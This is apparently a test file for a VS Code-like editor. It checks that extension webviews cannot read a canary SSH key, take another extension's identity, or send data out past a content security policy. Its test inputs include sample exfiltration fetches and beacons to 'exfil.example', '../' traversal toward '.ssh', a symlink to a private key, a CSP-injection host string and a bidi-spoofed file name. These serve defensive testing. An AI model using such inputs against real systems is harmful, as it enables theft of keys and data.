/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Volt ADK. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

// Volt P5 (spec B-08, B-23, I.10, INV-19, INV-20): core owns an extension's webview.
// T3-WEBVIEW-1: a webview asking for `localResourceRoots: ['/']` can't load a canary outside its roots.
// IPC-3 (webviews): a payload naming another extension, or a forged location, gets nothing of it.
// WEB-4: the CSP floor core writes, checked as strings and in a real document.
// WEB-5 (webviews): a sandboxed extension's page clicking a link out of Volt asks like openExternal.
// Regression: the Markdown preview's roots (workspace, other extensions' preview styles, a file
// outside the workspace) still resolve.

import assert from 'assert';
import { timeout } from '../../../../base/common/async.js';
import { mainWindow } from '../../../../base/browser/window.js';
import { VSBuffer } from '../../../../base/common/buffer.js';
import { CancellationToken } from '../../../../base/common/cancellation.js';
import { Emitter, Event } from '../../../../base/common/event.js';
import { DisposableStore } from '../../../../base/common/lifecycle.js';
import { URI } from '../../../../base/common/uri.js';
import { mock } from '../../../../base/test/common/mock.js';
import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../base/test/common/utils.js';
import { IConfigurationChangeEvent, IConfigurationService } from '../../../../platform/configuration/common/configuration.js';
import { TestConfigurationService } from '../../../../platform/configuration/test/common/testConfigurationService.js';
import { ExtensionIdentifier, IExtensionDescription } from '../../../../platform/extensions/common/extensions.js';
import { FileService } from '../../../../platform/files/common/fileService.js';
import { InMemoryFileSystemProvider } from '../../../../platform/files/common/inMemoryFilesystemProvider.js';
import { TestInstantiationService } from '../../../../platform/instantiation/test/common/instantiationServiceMock.js';
import { ILogService, NullLogService } from '../../../../platform/log/common/log.js';
import { IConfirmation, IConfirmationResult, IDialogService } from '../../../../platform/dialogs/common/dialogs.js';
import { IOpenerService, OpenOptions } from '../../../../platform/opener/common/opener.js';
import { IProductService } from '../../../../platform/product/common/productService.js';
import { InMemoryStorageService } from '../../../../platform/storage/common/storage.js';
import { ITelemetryService } from '../../../../platform/telemetry/common/telemetry.js';
import { NullTelemetryService } from '../../../../platform/telemetry/common/telemetryUtils.js';
import { IUserDataProfilesService } from '../../../../platform/userDataProfile/common/userDataProfile.js';
import { toWorkspaceFolder, IWorkspaceContextService } from '../../../../platform/workspace/common/workspace.js';
import { IWorkspaceTrustManagementService } from '../../../../platform/workspace/common/workspaceTrust.js';
import { Workspace } from '../../../../platform/workspace/test/common/testWorkspace.js';
import { EditorInput } from '../../../common/editor/editorInput.js';
import { IOverlayWebview, WebviewContentOptions, WebviewExtensionDescription } from '../../../contrib/webview/browser/webview.js';
import { loadLocalResource, WebviewResourceResponse } from '../../../contrib/webview/browser/resourceLoading.js';
import { clampLocalResourceRoots, cspSourcesForHosts, isDocumentFolderReadable, promptSafeText, VOLT_SANDBOXED_EXTENSIONS_SETTING, webviewOwnerPolicy } from '../../../contrib/webview/common/voltWebviewOwnership.js';
import { WebviewInput } from '../../../contrib/webviewPanel/browser/webviewEditorInput.js';
import { IWebviewWorkbenchService } from '../../../contrib/webviewPanel/browser/webviewWorkbenchService.js';
import { IWebviewViewService, WebviewView } from '../../../contrib/webviewView/browser/webviewViewService.js';
import { IEditorGroupsService } from '../../../services/editor/common/editorGroupsService.js';
import { IEditorService } from '../../../services/editor/common/editorService.js';
import { IWorkbenchEnvironmentService } from '../../../services/environment/common/environmentService.js';
import { ExtensionNotInHostError } from '../../../services/extensions/common/extHostCustomers.js';
import { IExtensionService, nullExtensionDescription } from '../../../services/extensions/common/extensions.js';
import { IPathService } from '../../../services/path/common/pathService.js';
import { IUserDataProfileService } from '../../../services/userDataProfile/common/userDataProfile.js';
import { TestContextService, TestWorkspaceTrustManagementService } from '../../../test/common/workbenchTestServices.js';
import { MainThreadWebviewPanels } from '../../browser/mainThreadWebviewPanels.js';
import { MainThreadWebviews } from '../../browser/mainThreadWebviews.js';
import { MainThreadWebviewsViews } from '../../browser/mainThreadWebviewViews.js';
import { grantedNetHosts } from '../../browser/voltWebviewOwnership.js';
import { ExtHostContext, ExtHostWebviewPanelsShape, ExtHostWebviewViewsShape } from '../../common/extHost.protocol.js';
import { TestRPCProtocol } from '../common/testRPCProtocol.js';

type IWebviewViewResolver = Parameters<IWebviewViewService['register']>[1];

const HOME = URI.file('/home/user');
const WORKSPACE = URI.file('/work/repo');
const EXTENSIONS = URI.file('/home/user/.volt/extensions');
const CANARY = URI.file('/home/user/.ssh/id_ed25519');

function extension(id: string, options: { builtin?: boolean; contributes?: object } = {}): IExtensionDescription {
	const [publisher, name] = id.split('.');
	return {
		...nullExtensionDescription,
		identifier: new ExtensionIdentifier(id),
		publisher,
		name,
		extensionLocation: URI.joinPath(EXTENSIONS, `${id}-1.0.0`),
		isBuiltin: !!options.builtin,
		contributes: options.contributes,
	};
}

class FakeWebview extends mock<IOverlayWebview>() {
	private readonly _onDidDispose = new Emitter<void>();
	override readonly onDidDispose = this._onDidDispose.event;
	/** Fires a link the page clicked. */
	readonly clicks = new Emitter<string>();
	override readonly onDidClickLink = this.clicks.event;
	override readonly onMessage = Event.None;
	override readonly onMissingCsp = Event.None;
	override extension: WebviewExtensionDescription | undefined;
	override contentOptions: WebviewContentOptions;
	html = '';
	constructor(contentOptions: WebviewContentOptions = {}, owner?: WebviewExtensionDescription) {
		super();
		this.contentOptions = contentOptions;
		this.extension = owner;
	}
	override setHtml(html: string): void {
		this.html = html;
	}
	override dispose(): void {
		this._onDidDispose.fire();
		this._onDidDispose.dispose();
		this.clicks.dispose();
	}
}

suite('Volt: webview ownership (P5)', () => {

	const store = ensureNoDisposablesAreLeakedInTestSuite();

	interface IHarness {
		readonly webviews: MainThreadWebviews;
		readonly panels: MainThreadWebviewPanels;
		readonly config: TestConfigurationService;
		readonly trust: TestWorkspaceTrustManagementService;
		readonly opened: FakeWebview[];
		readonly logs: string[];
		readonly views: Map<string, IWebviewViewResolver>;
		readonly instantiation: TestInstantiationService;
		/** Links handed to the opener, and the confirmations Volt showed. */
		readonly openedLinks: { readonly link: string; readonly skipValidation: boolean | undefined }[];
		readonly asked: IConfirmation[];
		create(id: string | object, roots: URI[] | undefined, location?: URI): FakeWebview;
	}

	/** A host that runs `hosted`; `all` are every extension Volt knows (other hosts' too). */
	function harness(hosted: IExtensionDescription[], options: { all?: IExtensionDescription[]; trusted?: boolean; editors?: URI[]; sandboxed?: string[]; confirm?: boolean } = {}): IHarness {
		const disposables = store.add(new DisposableStore());
		// Disposed first: a closing webview still reaches the panel and webview customers.
		const webviewStore = disposables.add(new DisposableStore());
		const all = options.all ?? hosted;
		const rpc = disposables.add(new TestRPCProtocol());
		rpc.hostsExtension = id => hosted.some(own => ExtensionIdentifier.equals(own.identifier, typeof id === 'string' ? id : id.value));
		rpc.set(ExtHostContext.ExtHostWebviewPanels, new class extends mock<ExtHostWebviewPanelsShape>() {
			override async $onDidDisposeWebviewPanel() { }
		});
		const config = new TestConfigurationService();
		config.setUserConfiguration(VOLT_SANDBOXED_EXTENSIONS_SETTING, options.sandboxed ?? []);
		const trust = disposables.add(new TestWorkspaceTrustManagementService(options.trusted ?? true));
		const logs: string[] = [];
		const instantiation = disposables.add(new TestInstantiationService());
		instantiation.stub(IExtensionService, new class extends mock<IExtensionService>() {
			override readonly extensions = all;
			override activateByEvent() { return Promise.resolve(); }
		});
		instantiation.stub(IConfigurationService, config);
		instantiation.stub(IWorkspaceContextService, new TestContextService(new Workspace('ws-id', [toWorkspaceFolder(WORKSPACE)])));
		instantiation.stub(IWorkspaceTrustManagementService, trust);
		instantiation.stub(IWorkbenchEnvironmentService, new class extends mock<IWorkbenchEnvironmentService>() {
			override readonly workspaceStorageHome = URI.file('/home/user/.volt/data/workspaceStorage');
		});
		instantiation.stub(IUserDataProfilesService, new class extends mock<IUserDataProfilesService>() {
			override readonly defaultProfile = new class extends mock<IUserDataProfilesService['defaultProfile']>() {
				override readonly globalStorageHome = URI.file('/home/user/.volt/data/globalStorage');
			};
		});
		instantiation.stub(IUserDataProfileService, new class extends mock<IUserDataProfileService>() {
			override readonly currentProfile = new class extends mock<IUserDataProfileService['currentProfile']>() {
				override readonly globalStorageHome = URI.file('/home/user/.volt/data/globalStorage');
			};
		});
		instantiation.stub(IEditorService, new class extends mock<IEditorService>() {
			override readonly editors = (options.editors ?? []).map(resource => new class extends mock<EditorInput>() {
				override readonly typeId = 'test.editor';
				override readonly resource = resource;
			});
			override readonly onDidActiveEditorChange = Event.None;
			override readonly onDidVisibleEditorsChange = Event.None;
		});
		instantiation.stub(IPathService, new class extends mock<IPathService>() {
			override readonly resolvedUserHome = HOME;
		});
		instantiation.stub(ILogService, new class extends NullLogService {
			override warn(message: string): void { logs.push(message); }
		});
		const openedLinks: { link: string; skipValidation: boolean | undefined }[] = [];
		instantiation.stub(IOpenerService, new class extends mock<IOpenerService>() {
			override async open(target: URI | string, openOptions?: OpenOptions) {
				openedLinks.push({ link: target.toString(), skipValidation: openOptions?.skipValidation });
				return true;
			}
		});
		const asked: IConfirmation[] = [];
		instantiation.stub(IDialogService, new class extends mock<IDialogService>() {
			override async confirm(confirmation: IConfirmation): Promise<IConfirmationResult> {
				asked.push(confirmation);
				return { confirmed: !!options.confirm };
			}
		});
		instantiation.stub(IProductService, new class extends mock<IProductService>() {
			override readonly urlProtocol = 'volt';
		});
		instantiation.stub(ITelemetryService, NullTelemetryService);

		const views = new Map<string, IWebviewViewResolver>();
		instantiation.stub(IWebviewViewService, new class extends mock<IWebviewViewService>() {
			override register(viewType: string, resolver: IWebviewViewResolver) {
				views.set(viewType, resolver);
				return { dispose: () => views.delete(viewType) };
			}
		});

		const webviews = disposables.add(instantiation.createInstance(MainThreadWebviews, rpc));
		const opened: FakeWebview[] = [];
		const panels = disposables.add(new MainThreadWebviewPanels(
			rpc,
			webviews,
			config,
			new class extends mock<IEditorGroupsService>() {
				override onDidAddGroup = Event.None;
				override onDidRemoveGroup = Event.None;
				override onDidMoveGroup = Event.None;
			},
			instantiation.get(IEditorService),
			instantiation.get(IExtensionService),
			disposables.add(new InMemoryStorageService()),
			new class extends mock<IWebviewWorkbenchService>() {
				override onDidChangeActiveWebviewEditor = Event.None;
				override registerResolver() { return { dispose() { } }; }
				override openWebview(init: { origin?: string; contentOptions: WebviewContentOptions; extension?: WebviewExtensionDescription }): WebviewInput {
					const webview = webviewStore.add(new FakeWebview(init.contentOptions, init.extension));
					opened.push(webview);
					return new class extends mock<WebviewInput>() {
						override get webview() { return webview; }
					};
				}
			},
		));
		let next = 0;
		return {
			webviews, panels, config, trust, opened, logs, views, instantiation, openedLinks, asked,
			create(id, roots, location = URI.file('/')) {
				const handle = `h${next++}`;
				panels.$createWebviewPanel(
					{ id: (typeof id === 'string' ? new ExtensionIdentifier(id) : id) as ExtensionIdentifier, location },
					handle, 'view', { title: 't', panelOptions: {}, webviewOptions: { enableScripts: true, localResourceRoots: roots }, serializeBuffersForPostMessage: false }, {});
				return opened[opened.length - 1];
			},
		};
	}

	function roots(webview: FakeWebview): string[] {
		return (webview.contentOptions.localResourceRoots ?? []).map(root => root.path);
	}

	async function load(webview: FakeWebview, resource: URI, files: Record<string, string>): Promise<WebviewResourceResponse.Type> {
		const disposables = store.add(new DisposableStore());
		const fileService = disposables.add(new FileService(new NullLogService()));
		const provider = disposables.add(new InMemoryFileSystemProvider());
		disposables.add(fileService.registerProvider('file', provider));
		for (const [path, contents] of Object.entries(files)) {
			const uri = URI.file(path);
			await fileService.createFolder(URI.joinPath(uri, '..'));
			await fileService.writeFile(uri, VSBuffer.fromString(contents));
		}
		const result = await loadLocalResource(resource, { ifNoneMatch: undefined, roots: webview.contentOptions.localResourceRoots ?? [] }, fileService, new NullLogService(), CancellationToken.None);
		if (result.type === WebviewResourceResponse.Type.Success) {
			result.stream.destroy();
		}
		return result.type;
	}

	// --- T3-WEBVIEW-1 ----------------------------------------------------------------------------

	test('T3-WEBVIEW-1: a webview asking for localResourceRoots [\'/\'] cannot load a canary outside its roots', async () => {
		const mine = extension('pub.mine');
		const h = harness([mine]);
		const files = {
			[CANARY.path]: 'CANARY PRIVATE KEY',
			[URI.joinPath(mine.extensionLocation, 'media/app.css').path]: 'body {}',
		};

		// The control: with the roots it asked for, the canary is readable through the resource route.
		const unclamped = store.add(new FakeWebview({ localResourceRoots: [URI.file('/')] }));
		assert.strictEqual(await load(unclamped, CANARY, files), WebviewResourceResponse.Type.Success, 'the canary exists and / would expose it');

		const webview = h.create('pub.mine', [URI.file('/'), URI.joinPath(mine.extensionLocation, 'media')]);
		assert.deepStrictEqual(roots(webview), [URI.joinPath(mine.extensionLocation, 'media').path]);
		assert.strictEqual(await load(webview, CANARY, files), WebviewResourceResponse.Type.AccessDenied);
		assert.strictEqual(await load(webview, URI.joinPath(mine.extensionLocation, 'media/app.css'), files), WebviewResourceResponse.Type.Success, 'its own files still load');
		assert.ok(h.logs.some(line => line.includes('pub.mine') && line.includes('file:///')), 'the dropped root is logged');

		// Every later $setOptions is clamped the same way, `..` included.
		const handle = 'h0';
		h.webviews.$setOptions(handle, { localResourceRoots: [URI.file('/home/user/.ssh'), URI.joinPath(mine.extensionLocation, '../../../.ssh'), WORKSPACE] });
		assert.deepStrictEqual(roots(webview), [WORKSPACE.path]);
		assert.strictEqual(await load(webview, CANARY, files), WebviewResourceResponse.Type.AccessDenied);
	});

	test('T3-WEBVIEW-1: another extension\'s folder, the home folder and Volt\'s user data are dropped; its own storage is kept', () => {
		const mine = extension('pub.mine');
		const other = extension('pub.other');
		const h = harness([mine], { all: [mine, other] });
		const globalStorage = URI.file('/home/user/.volt/data/globalStorage/pub.mine');
		const workspaceStorage = URI.file('/home/user/.volt/data/workspaceStorage/ws-id/pub.mine');
		const webview = h.create('pub.mine', [
			other.extensionLocation,
			HOME,
			URI.file('/home/user/.volt/data/globalStorage'),
			URI.from({ scheme: 'vscode-userdata', path: '/home/user/.volt/data/User' }),
			globalStorage,
			workspaceStorage,
		]);
		assert.deepStrictEqual(roots(webview), [globalStorage.path, workspaceStorage.path]);
	});

	test('T3-WEBVIEW-1: a sandboxed extension\'s webview checks the real path, so a symlink in its roots leads nowhere', async () => {
		const realpaths = new Map([[URI.file('/work/repo/k/id_ed25519').toString(), '/home/user/.ssh/id_ed25519']]);
		const fileService = new class extends mock<FileService>() {
			override async realpath(resource: URI) { return resource.with({ path: realpaths.get(resource.toString()) ?? resource.path }); }
			override async readFileStream(): Promise<never> { throw new Error('must not be read'); }
		};
		const result = await loadLocalResource(URI.file('/work/repo/k/id_ed25519'), { ifNoneMatch: undefined, roots: [WORKSPACE], resolveSymlinks: true }, fileService, new NullLogService(), CancellationToken.None);
		assert.strictEqual(result.type, WebviewResourceResponse.Type.AccessDenied);
	});

	// --- Identity --------------------------------------------------------------------------------

	test('IPC-3: a payload naming another extension cannot take its origin, and a forged location reads nothing', () => {
		const mine = extension('pub.mine');
		const git = extension('vscode.git', { builtin: true });
		const h = harness([mine], { all: [mine, git] });
		assert.throws(() => h.create('vscode.git', [git.extensionLocation]), (err: unknown) => err instanceof ExtensionNotInHostError);
		assert.throws(() => h.create({ value: 'vscode.git', _lower: 'pub.mine' }, [git.extensionLocation]), (err: unknown) => err instanceof ExtensionNotInHostError);
		assert.strictEqual(h.opened.length, 0);

		// The payload says its extension lives at `/`: core uses the location it knows instead.
		const webview = h.create('pub.mine', [URI.file('/'), URI.file('/etc')], URI.file('/'));
		assert.strictEqual(webview.extension?.location?.path, mine.extensionLocation.path);
		assert.deepStrictEqual(roots(webview), []);
	});

	test('IPC-3: a view provider for another extension\'s webview view is refused; its own resolves', async () => {
		const mine = extension('pub.mine');
		const other = extension('pub.other');
		const h = harness([mine], { all: [mine, other] });
		const rpc = store.add(new TestRPCProtocol());
		rpc.set(ExtHostContext.ExtHostWebviewViews, new class extends mock<ExtHostWebviewViewsShape>() {
			override async $resolveWebviewView() { }
			override async $disposeWebviewView() { }
		});
		const views = store.add(h.instantiation.createInstance(MainThreadWebviewsViews, rpc, h.webviews));
		views.$registerWebviewViewProvider({ id: new ExtensionIdentifier('pub.mine'), location: URI.file('/') }, 'pub.other.view', { serializeBuffersForPostMessage: false });
		views.$registerWebviewViewProvider({ id: new ExtensionIdentifier('pub.mine'), location: URI.file('/') }, 'pub.mine.view', { serializeBuffersForPostMessage: false });
		assert.throws(() => views.$registerWebviewViewProvider({ id: new ExtensionIdentifier('pub.other'), location: URI.file('/') }, 'x', { serializeBuffersForPostMessage: false }), (err: unknown) => err instanceof ExtensionNotInHostError);

		const viewOf = (webview: FakeWebview): WebviewView => {
			const onDispose = store.add(new Emitter<void>());
			let disposed = false;
			return new class extends mock<WebviewView>() {
				override readonly webview = webview;
				override readonly onDidChangeVisibility = Event.None;
				override readonly onDispose = onDispose.event;
				override dispose() {
					if (!disposed) {
						disposed = true;
						onDispose.fire();
					}
				}
			};
		};
		// The pane made the webview with its contributing extension.
		const foreign = store.add(new FakeWebview({}, { id: other.identifier }));
		await h.views.get('pub.other.view')!.resolve(viewOf(foreign), CancellationToken.None);
		assert.ok(foreign.html.includes('pub.other.view'), 'the view shows the error page');
		assert.strictEqual(foreign.extension?.id.value, 'pub.other', 'the provider did not become its owner');
		assert.ok(h.logs.some(line => line.includes('pub.mine tried to provide the view pub.other.view')));

		const own = store.add(new FakeWebview({}, { id: mine.identifier }));
		await h.views.get('pub.mine.view')!.resolve(viewOf(own), CancellationToken.None);
		assert.strictEqual(own.extension?.location?.path, mine.extensionLocation.path);
		assert.ok(own.contentOptions.ownerPolicy, 'core wrote its floor');
	});

	// --- Markdown preview and other built-ins ----------------------------------------------------

	test('regression: the Markdown preview keeps its roots: workspace, previewed file outside it, extensions contributing preview styles', async () => {
		const markdown = extension('vscode.markdown-language-features', { builtin: true });
		const mermaid = extension('bierner.markdown-mermaid', { contributes: { 'markdown.previewScripts': ['./dist/index.js'] } });
		const unrelated = extension('pub.unrelated');
		const outside = URI.file('/home/user/notes/readme.md');
		const h = harness([markdown], { all: [markdown, mermaid, unrelated], editors: [outside] });
		const media = URI.joinPath(markdown.extensionLocation, 'media');
		const webview = h.create('vscode.markdown-language-features', [media, mermaid.extensionLocation, WORKSPACE, URI.file('/home/user/notes'), unrelated.extensionLocation]);
		assert.deepStrictEqual(roots(webview), [media.path, mermaid.extensionLocation.path, WORKSPACE.path, '/home/user/notes']);

		const files = {
			[URI.joinPath(WORKSPACE, 'docs/image.png').path]: 'png',
			[URI.file('/home/user/notes/diagram.png').path]: 'png',
			[URI.joinPath(mermaid.extensionLocation, 'dist/index.js').path]: 'js',
			[CANARY.path]: 'key',
		};
		assert.strictEqual(await load(webview, URI.joinPath(WORKSPACE, 'docs/image.png'), files), WebviewResourceResponse.Type.Success);
		assert.strictEqual(await load(webview, URI.file('/home/user/notes/diagram.png'), files), WebviewResourceResponse.Type.Success);
		assert.strictEqual(await load(webview, URI.joinPath(mermaid.extensionLocation, 'dist/index.js'), files), WebviewResourceResponse.Type.Success);
		assert.strictEqual(await load(webview, CANARY, files), WebviewResourceResponse.Type.AccessDenied);
	});

	test('regression: Restricted Mode keeps the workspace for built-ins, drops it for third parties, and trusting it brings it back', async () => {
		const markdown = extension('vscode.markdown-language-features', { builtin: true });
		const preview = extension('pub.preview');
		const h = harness([markdown, preview], { trusted: false });
		const builtin = h.create('vscode.markdown-language-features', [WORKSPACE]);
		const thirdParty = h.create('pub.preview', [WORKSPACE, URI.joinPath(preview.extensionLocation, 'media')]);
		assert.deepStrictEqual(roots(builtin), [WORKSPACE.path]);
		assert.deepStrictEqual(roots(thirdParty), [URI.joinPath(preview.extensionLocation, 'media').path]);
		await h.trust.setWorkspaceTrust(true);
		assert.deepStrictEqual(roots(thirdParty), [WORKSPACE.path, URI.joinPath(preview.extensionLocation, 'media').path], 'the requested roots are re-clamped when trust changes');
	});

	test('a home-folder or file-system-root document folder never becomes readable', () => {
		assert.strictEqual(isDocumentFolderReadable(URI.file('/home/user/notes'), HOME), true);
		assert.strictEqual(isDocumentFolderReadable(HOME, HOME), false);
		assert.strictEqual(isDocumentFolderReadable(URI.file('/'), HOME), false);
		assert.strictEqual(isDocumentFolderReadable(URI.file('c:/'), HOME), false);
		const h = harness([extension('pub.mine')], { editors: [URI.file('/home/user/todo.md'), URI.file('/root.md')] });
		assert.deepStrictEqual(roots(h.create('pub.mine', [HOME, URI.file('/')])), []);
	});

	test('regression: a custom editor\'s document right in the home folder stays readable, as that file alone', async () => {
		const mine = extension('vscode.media-preview', { builtin: true });
		const h = harness([mine]);
		const photo = URI.file('/home/user/photo.png');
		const webview = store.add(new FakeWebview());
		h.webviews.addWebview('editor', webview, { serializeBuffersForPostMessage: false });
		// What media-preview asks for: the document's folder and its own folder.
		h.webviews.setOwner('editor', h.webviews.ownership.extension({ id: mine.identifier }), { localResourceRoots: [HOME, mine.extensionLocation] }, { document: photo });
		assert.deepStrictEqual(roots(webview), [mine.extensionLocation.path, photo.path]);
		const files = { [photo.path]: 'png', [CANARY.path]: 'key' };
		assert.strictEqual(await load(webview, photo, files), WebviewResourceResponse.Type.Success);
		assert.strictEqual(await load(webview, CANARY, files), WebviewResourceResponse.Type.AccessDenied);
		// A document in an ordinary folder gets the folder, as media-preview expects.
		h.webviews.setOwner('editor', h.webviews.ownership.extension({ id: mine.identifier }), { localResourceRoots: [URI.file('/home/user/pics')] }, { document: URI.file('/home/user/pics/a.png') });
		assert.deepStrictEqual(roots(webview), ['/home/user/pics']);
	});

	test('virtual file systems: kept for an unsandboxed extension, dropped for a sandboxed one', () => {
		const memfs = URI.from({ scheme: 'memfs', path: '/' });
		assert.deepStrictEqual(clampLocalResourceRoots([memfs], [], true).kept.map(String), [memfs.toString()]);
		assert.deepStrictEqual(clampLocalResourceRoots([memfs], [], false).kept, []);
		assert.deepStrictEqual(clampLocalResourceRoots(undefined, [], true), { kept: [], dropped: [] });
	});

	// --- WEB-4: the CSP floor --------------------------------------------------------------------

	test('WEB-4: every extension webview gets a floor that blocks file: and other schemes, not the web', () => {
		const h = harness([extension('pub.mine')]);
		const webview = h.create('pub.mine', []);
		const csp = webview.contentOptions.ownerPolicy?.csp ?? '';
		for (const directive of ['connect-src', 'img-src', 'media-src', 'font-src', 'frame-src', 'form-action']) {
			assert.ok(new RegExp(`(^|; )${directive} `).test(csp), `${directive} is set`);
		}
		assert.ok(!/file:|vscode-file:|\*(;|$| )/.test(csp), 'no file:, vscode-file: or bare * source');
		assert.ok(/img-src [^;]*https:/.test(csp) && /connect-src [^;]*wss:/.test(csp), 'web images and sockets keep working');
		assert.strictEqual(webview.contentOptions.ownerPolicy?.egressHosts, undefined, 'unsandboxed: no egress list');
	});

	test('WEB-4: a sandboxed extension\'s webview reaches only the net.connect hosts it declares', () => {
		const contributes = { voltCapabilities: { required: [{ id: 'net.connect', class: 'low', targets: ['api.example.com', '*.cdn.example.com'] }] } };
		const sandboxed = extension('pub.box', { contributes });
		const h = harness([sandboxed], { sandboxed: ['PUB.box'] });
		const policy = h.create('pub.box', []).contentOptions.ownerPolicy!;
		assert.deepStrictEqual(policy.egressHosts, ['*.cdn.example.com', 'api.example.com']);
		assert.ok(policy.csp.startsWith('default-src \'self\''));
		assert.ok(!/ https: | http: /.test(` ${policy.csp} `), 'no blanket web source');
		assert.ok(policy.csp.includes('https://api.example.com') && policy.csp.includes('wss://*.cdn.example.com'));
		assert.ok(policy.csp.includes('form-action https://'));

		const none = webviewOwnerPolicy(true, []);
		assert.ok(none.csp.includes('form-action \'none\''));
		assert.deepStrictEqual(none.egressHosts, []);
		assert.deepStrictEqual(cspSourcesForHosts(['bad host; script-src *', 'ok.example:8443']), ['https://ok.example:8443', 'http://ok.example:8443', 'wss://ok.example:8443', 'ws://ok.example:8443']);
		assert.deepStrictEqual(cspSourcesForHosts(['*']), ['https:', 'http:', 'wss:', 'ws:']);
		assert.deepStrictEqual(grantedNetHosts(extension('pub.untargeted', { contributes: { voltCapabilities: { optional: [{ id: 'net.connect@1', class: 'low' }] } } })), ['*']);
		assert.deepStrictEqual(grantedNetHosts(extension('pub.nothing')), []);
	});

	test('WEB-4: turning the sandbox on for an extension tightens its open webviews', () => {
		const h = harness([extension('pub.mine')]);
		const webview = h.create('pub.mine', [WORKSPACE]);
		assert.strictEqual(webview.contentOptions.ownerPolicy?.egressHosts, undefined);
		h.config.setUserConfiguration(VOLT_SANDBOXED_EXTENSIONS_SETTING, ['pub.mine']);
		h.config.onDidChangeConfigurationEmitter.fire(new class extends mock<IConfigurationChangeEvent>() {
			override affectsConfiguration(key: string) { return key === VOLT_SANDBOXED_EXTENSIONS_SETTING; }
		});
		assert.deepStrictEqual(webview.contentOptions.ownerPolicy?.egressHosts, []);
	});

	test('WEB-4: Chromium enforces the floor: file: images and ungranted fetches are refused by CSP', async () => {
		const open = await cspViolations(webviewOwnerPolicy(false, []).csp, `
			const image = src => { const img = document.createElement('img'); img.src = src; document.body.appendChild(img); };
			image('vscode-remote-resource://127.0.0.1:1/etc/hosts');
			image('data:image/gif;base64,R0lGODlhAQABAAAAACw=');
			fetch('vscode-file://vscode-app/etc/hosts').catch(() => undefined);
			fetch('http://localhost:1/web-still-works').catch(() => undefined);
		`);
		// (file: itself never gets as far as CSP: Chromium refuses local resources to a non-file page.)
		assert.deepStrictEqual(open.map(entry => entry.replace(/^(\S+) ([a-z-]+).*$/, '$1 $2')).sort(), ['connect-src vscode-file', 'img-src vscode-remote-resource'], open.join(', '));

		const strict = await cspViolations(webviewOwnerPolicy(true, ['localhost:1']).csp, `
			fetch('https://exfil.example/beacon').catch(() => undefined);
			fetch('http://localhost:1/granted').catch(() => undefined);
			new Image().src = 'https://exfil.example/pixel.gif';
		`);
		assert.deepStrictEqual(strict.sort(), ['connect-src https://exfil.example/beacon', 'img-src https://exfil.example/pixel.gif']);
	});

	// --- WEB-5: links the page clicks ------------------------------------------------------------

	test('WEB-5: a link a sandboxed extension\'s page clicks to an ungranted host asks first; refused, nothing opens', async () => {
		const contributes = { voltCapabilities: { required: [{ id: 'net.connect', class: 'low', targets: ['api.example.com'] }] } };
		// Unique ids: the prompt budget is per extension and lives as long as the window.
		const box = extension('pub.webfivelinkbox', { contributes });
		const plain = extension('pub.webfivelinkplain');
		const h = harness([box, plain], { sandboxed: ['pub.webfivelinkbox'] });
		const boxed = h.create('pub.webfivelinkbox', []);
		const open = h.create('pub.webfivelinkplain', []);
		const click = async (webview: FakeWebview, link: string) => {
			webview.clicks.fire(link);
			await timeout(0);
		};

		await click(boxed, 'https://api.example.com/docs');
		await click(open, 'https://exfil.example/?d=1');
		assert.strictEqual(h.asked.length, 0, 'a granted host, or an unsandboxed page, opens as before');
		assert.deepStrictEqual(h.openedLinks.map(entry => entry.link), ['https://api.example.com/docs', 'https://exfil.example/?d=1']);

		await click(boxed, 'https://exfil.example/?d=secret');
		assert.strictEqual(h.asked.length, 1);
		assert.ok(h.asked[0].detail?.includes('https://exfil.example/?d=secret'), 'the full URL is shown');
		assert.strictEqual(h.openedLinks.length, 2, 'refused: nothing opens');

		const confirming = harness([extension('pub.webfivelinkyes')], { sandboxed: ['pub.webfivelinkyes'], confirm: true });
		await click(confirming.create('pub.webfivelinkyes', []), 'mailto:someone@example.com');
		assert.strictEqual(confirming.asked.length, 1);
		assert.deepStrictEqual(confirming.openedLinks, [{ link: 'mailto:someone@example.com', skipValidation: true }]);
	});

	test('prompt text: invisible and bidi characters are stripped, long text is cut', () => {
		assert.strictEqual(promptSafeText('https://a.example/\u202Egnp.exe\u200B', 100), 'https://a.example/gnp.exe');
		assert.strictEqual(promptSafeText('x'.repeat(20), 5), 'xxxxx...');
	});
});

/**
 * Runs `script` in a frame of its own (an opaque origin, as a webview's is its own
 * `vscode-webview:` origin, so `'self'` is not the test page's `file:`) whose only policy is
 * `csp`, and returns the violations Chromium reported (`<directive> <blocked URL>`): the policy
 * strings are proven to mean what they say in a real document. Nothing reaches the network.
 */
async function cspViolations(csp: string, script: string): Promise<string[]> {
	const frame = mainWindow.document.createElement('iframe');
	frame.setAttribute('sandbox', 'allow-scripts');
	frame.srcdoc = `<!DOCTYPE html><html><head><meta http-equiv="Content-Security-Policy" content="${csp.replace(/"/g, '&quot;')}"></head><body><script>
		const violations = [];
		document.addEventListener('securitypolicyviolation', e => violations.push(e.effectiveDirective + ' ' + e.blockedURI));
		${script}
		setTimeout(() => parent.postMessage({ cspViolations: violations }, '*'), 300);
	</script></body></html>`;
	const reported = new Promise<string[]>(resolve => {
		const onMessage = (e: MessageEvent) => {
			if (e.source === frame.contentWindow && Array.isArray(e.data?.cspViolations)) {
				mainWindow.removeEventListener('message', onMessage);
				resolve(e.data.cspViolations);
			}
		};
		mainWindow.addEventListener('message', onMessage);
	});
	mainWindow.document.body.appendChild(frame);
	try {
		return await reported;
	} finally {
		frame.remove();
	}
}
